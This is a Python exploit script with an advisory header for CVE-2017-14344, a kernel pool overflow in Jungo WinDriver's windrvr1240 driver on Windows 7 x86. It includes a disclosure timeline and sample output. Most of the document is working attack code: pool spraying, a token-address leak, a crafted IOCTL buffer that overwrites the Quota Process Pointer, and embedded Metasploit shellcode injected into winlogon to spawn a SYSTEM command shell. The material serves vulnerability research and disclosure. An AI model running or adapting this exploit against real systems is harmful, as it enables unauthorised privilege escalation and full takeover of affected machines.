# -*- coding: utf-8 -*-
"""
Jungo DriverWizard WinDriver Kernel Pool Overflow Vulnerability

Download: http://www.jungo.com/st/products/windriver/
File:     WD1240.EXE
Sha1:     3527cc974ec885166f0d96f6aedc8e542bb66cba
Driver:   windrvr1240.sys
Sha1:     0f212075d86ef7e859c1941f8e5b9e7a6f2558ad
CVE:      CVE-2017-14344
Author:   Steven Seeley (mr_me) of Source Incite
Affected: <= v12.4.0
Thanks:   @dronesec & @FuzzySec !

Summary:
========

This vulnerability allows local attackers to escalate privileges on vulnerable installations of Jungo WinDriver. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. 

The specific flaw exists within the processing of IOCTL 0x95382673 by the windrvr1240 kernel driver. The issue lies in the failure to properly validate user-supplied data which can result in a kernel pool overflow. An attacker can leverage this vulnerability to execute arbitrary code under the context of kernel.

Timeline:
=========

2017-08-22 – Verified and sent to Jungo via sales@/first@/security@/info@jungo.com
2017-08-25 – No response from Jungo and two bounced emails
2017-08-26 – Attempted a follow up with the vendor via website chat
2017-08-26 – No response via the website chat
2017-09-03 – Recieved an email from a Jungo representative stating that they are "looking into it"
2017-09-03 – Requested a timeframe for patch development and warned of possible 0day release
2017-09-06 – No response from Jungo
2017-09-06 – Public 0day release of advisory

Exploitation:
=============

This exploit uses a data only attack via the Quota Process Pointer Overwrite technique. We smash the token and dec a controlled address by 0x50 (size of the Mutant) to enable SeDebugPrivilege's. Then we inject code into a system process.

References:
===========

- https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf
- https://github.com/hatRiot/token-priv

Example:
========

C:\Users\user\Desktop>whoami
debugee\user

C:\Users\user\Desktop>poc.py

        --[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]
                       Steven Seeley (mr_me) of Source Incite

(+) attacking WinDrvr1240 for a data only attack...
(+) sprayed the pool!
(+) made the pool holes!
(+) leaked token 0xa15535a0
(+) triggering pool overflow...
(+) allocating pool overflow input buffer
(+) elevating privileges!
(+) got a handle to winlogon! 0x2bd10
(+) allocated shellcode in winlogon @ 0xc0000
(+) WriteProcessMemory returned: 0x1
(+) RtlCreateUserThread returned: 0x0
(+) popped a SYSTEM shell!

C:\Users\user\Desktop>

in another terminal...

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
"""
from ctypes import *
from ctypes.wintypes import *
import struct, sys, os, time, psutil
from platform import release, architecture

ntdll    = windll.ntdll
kernel32 = windll.kernel32
MEM_COMMIT             = 0x00001000
MEM_RESERVE            = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS              = 0x0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE       = 0xC0000008
SystemExtendedHandleInformation = 64

class LSA_UNICODE_STRING(Structure):
    """Represent the LSA_UNICODE_STRING on ntdll."""
    _fields_ = [
        ("Length", USHORT),
        ("MaximumLength", USHORT),
        ("Buffer", LPWSTR),
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
    _fields_ = [
        ("Object", c_void_p),
        ("UniqueProcessId", ULONG),
        ("HandleValue", ULONG),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]
 
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    """Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
    _fields_ = [
        ("NumberOfHandles", ULONG),
        ("Reserved", ULONG),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
    """Represent the PUBLIC_OBJECT_TYPE_INFORMATION on ntdll."""
    _fields_ = [
        ("Name", LSA_UNICODE_STRING),
        ("Reserved", ULONG * 22),
    ]

class PROCESSENTRY32(Structure):
    _fields_ = [
        ("dwSize", c_ulong),
        ("cntUsage", c_ulong),
        ("th32ProcessID", c_ulong),
        ("th32DefaultHeapID", c_int),
        ("th32ModuleID", c_ulong),
        ("cntThreads", c_ulong),
        ("th32ParentProcessID", c_ulong),
        ("pcPriClassBase", c_long),
        ("dwFlags", c_ulong),
        ("szExeFile", c_wchar * MAX_PATH)
    ]

def signed_to_unsigned(signed):
    """
    Convert signed to unsigned integer.
    """
    unsigned, = struct.unpack ("L", struct.pack ("l", signed))
    return unsigned
                
def get_type_info(handle):
    """
    Get the handle type information to find our sprayed objects.
    """
    public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
    size = DWORD(sizeof(public_object_type_information))
    while True:
        result = signed_to_unsigned(
            ntdll.NtQueryObject(
                handle, 2, byref(public_object_type_information), size, None))
        if result == STATUS_SUCCESS:
            return public_object_type_information.Name.Buffer
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(public_object_type_information, size.value)
        elif result == STATUS_INVALID_HANDLE:
            return None
        else:
            raise x_file_handles("NtQueryObject.2", hex (result))

def get_handles():
    """
    Return all the processes handles in the system at the time.
    Can be done from LI (Low Integrity) level on Windows 7 x86.
    """
    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD (sizeof (system_handle_information))
    while True:
        result = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            byref(system_handle_information),
            size,
            byref(size)
        )
        result = signed_to_unsigned(result)
        if result == STATUS_SUCCESS:
            break
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_information, size.value)
        else:
            raise x_file_handles("NtQuerySystemInformation", hex(result))

    pHandles = cast(
        system_handle_information.Handles,
        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
                system_handle_information.NumberOfHandles)
    )
    for handle in pHandles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object

def we_can_spray():
    """
    Spray the Kernel Pool with IoCompletionReserve and Event Objects. 
    The IoCompletionReserve object is 0x60 and Event object is 0x40 bytes in length.
    These are allocated from the Nonpaged kernel pool.
    """
    handles = []
    for i in range(0, 50000):
        handles.append(windll.kernel32.CreateMutexA(None, False, None))
    # could do with some better validation
    if len(handles) > 0:
        return True
    return False

def alloc_pool_overflow_buffer(base, input_size):
    """
    Craft our special buffer to trigger the overflow.
    """
    print "(+) allocating pool overflow input buffer"
    baseadd   = c_int(base)
    size = c_int(input_size)

    input  = struct.pack("<I", 0x0000001a)     # size
    input += "\x44" * 0x398                    # offset to overflown chunks

    priv = token + 0x40 + 0x8                  # Enabled
    
    # patch
    input += struct.pack("<I", 0x040a008c)     # _POOL_HEADER
    input += struct.pack("<I", 0xe174754d)     # _POOL_HEADER
    input += "\x44" * 0x20
    input += struct.pack("<I", 0x00000000)
    input += struct.pack("<I", 0x00000001)
    input += "\x44" * 0x20
    input += struct.pack("<I", 0x00000001)
    input += struct.pack("<I", 0x00000000)
    input += "\x44" * 8
    input += struct.pack("<I", 0x00000001)
    input += struct.pack("<I", 0x00000001)
    input += "\x44" * 4
    input += struct.pack("<I", 0x0008000e)
    input += struct.pack("<I", priv)           # Quota Process Pointer Overwrite

    # filler
    input += "\x43" * (input_size-len(input))
    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
                                              POINTER(c_int), c_int, c_int]
    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
                                             byref(size), 
                                             MEM_RESERVE|MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE)
    if dwStatus != STATUS_SUCCESS:
        print "(-) error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
        return False
    written = c_ulong()
    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
    if write == 0:
        print "(-) error while writing our input buffer memory: %s" % write
        return False
    return True

def we_can_trigger_the_pool_overflow():
    """
    This triggers the pool overflow vulnerability using a buffer of size 0x460.
    """
    GENERIC_READ  = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    DEVICE_NAME   = "\\\\.\\WinDrvr1240"
    dwReturn      = c_ulong()
    driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
    inputbuffer       = 0x41414141
    inputbuffer_size  = 0x5000
    outputbuffer_size = 0x5000
    outputbuffer      = 0x20000000
    alloc_pool_overflow_buffer(inputbuffer, inputbuffer_size)
    IoStatusBlock = c_ulong()

    if driver_handle:
        dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle, None, None, None, byref(IoStatusBlock), 0x95382673,
                                                inputbuffer, inputbuffer_size, outputbuffer, outputbuffer_size)
        return True
    return False

def we_can_make_pool_holes():
    """
    This makes the pool holes that will coalesce into a hole of size 0x460.
    """
    global khandlesd, to_free
    mypid = os.getpid()
    khandlesd = {}
    to_free   = []

    # leak kernel handles
    for pid, handle, obj in get_handles():

        # mixed object attack
        if pid == mypid and get_type_info(handle) == "Mutant":
            khandlesd[obj] = handle

    # Find holes and make our allocation
    holes = []
    for obj in khandlesd.iterkeys():

        # obj address is the handle address, but we want to allocation
        # address, so we just remove the size of the object header from it.
        alloc = obj - 0x30

        # Get allocations at beginning of the page
        if (alloc & 0xfffff000) == alloc:
            bin = []
            
            # object sizes
            Mutant_size = 0x50

            # we use 0x10 since thats the left over freed chunk from filling the page
            offset = Mutant_size + 0x10
            for i in range(offset, offset + (0xe * Mutant_size), Mutant_size):

                if (obj + i) in khandlesd:
                    bin.append(khandlesd[obj + i])
                    
            # make sure it's contiguously allocated memory
            if len(tuple(bin)) == 0xe:

                # free the 2nd chunk only
                if (obj + i + (Mutant_size * 0x2)) in khandlesd:
                    to_free.append(khandlesd[obj + i + (Mutant_size * 0x2)])
                holes.append(tuple(bin))

    # make the holes to fill
    for hole in holes:
        for handle in hole:
            kernel32.CloseHandle(handle)
    return True

def we_can_leak_token():
    """
    Uses NtQuerySystemInformation to leak the token
    """
    global token
    hProcess = HANDLE(windll.kernel32.GetCurrentProcess())
    hToken = HANDLE()
    TOKEN_ALL_ACCESS = 0xf00ff
    windll.advapi32.OpenProcessToken(hProcess,TOKEN_ALL_ACCESS, byref(hToken))
    for pid, handle, obj in get_handles():
        if pid==os.getpid() and get_type_info(handle) == "Token":
            token = obj
            return True
    return False

def trigger_lpe():
    """
    This function frees the IoCompletionReserve objects and this triggers the 
    registered aexit, which is our controlled pointer to OkayToCloseProcedure.
    """
    # free the corrupted chunk to trigger OkayToCloseProcedure
    # we dont know where the free chunk is, we just know its in one of the pages 
    # full of Mutants and that its the 2nd chunk after the overflowed buffer.
    for v in to_free:
        kernel32.CloseHandle(v)

def get_winlogin_pid():
    for proc in psutil.process_iter():

        # choose whateva system process
        if proc.name() == "winlogon.exe":
            return proc.pid
    return 0

def we_can_inject():
    page_rwx_value = 0x40
    process_all = 0x1F0FFF
    memcommit = 0x00001000
    process_handle = windll.kernel32.OpenProcess(process_all, False, get_winlogin_pid()) # WinLogin
    if process_handle == 0:
        return False
    print "(+) got a handle to winlogon! 0x%x" % process_handle

    # metasploit EXITFUNC=Thread
    buf =  ""
    buf += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    buf += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d"
    buf += "\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    buf += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    buf += "\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"

    shellcode_length = len(buf)
    hThread = HANDLE()
    memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, 0, shellcode_length, memcommit, page_rwx_value)
    print "(+) allocated shellcode in winlogon @ 0x%x" % memory_allocation_variable
    res = windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, buf, shellcode_length, 0)
    print "(+) WriteProcessMemory returned: 0x%x" % res
    res = windll.ntdll.RtlCreateUserThread(process_handle, None, 0, 0, 0, 0, memory_allocation_variable, 0, byref(hThread), 0)
    print "(+) RtlCreateUserThread returned: 0x%x" % res
    return True

def main():
    print "\n\t--[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]"
    print "\t               Steven Seeley (mr_me) of Source Incite\r\n"

    if release() != "7" or architecture()[0] != "32bit":
        print "(-) although this exploit may work on this system,"
        print "    it was only designed for Windows 7 x86."
        sys.exit(-1)

    print "(+) attacking WinDrvr1240 for a data only attack..."
    if we_can_spray():
        print "(+) sprayed the pool!"
        if we_can_make_pool_holes():
            print "(+) made the pool holes!"
            if we_can_leak_token():
                print "(+) leaked token 0x%x" % token
                print "(+) triggering pool overflow..."
                if we_can_trigger_the_pool_overflow():
                    print "(+) elevating privileges!"
                    trigger_lpe()
                    if we_can_inject():
                        print "(+) popped a SYSTEM shell!"

if __name__ == '__main__':
    main()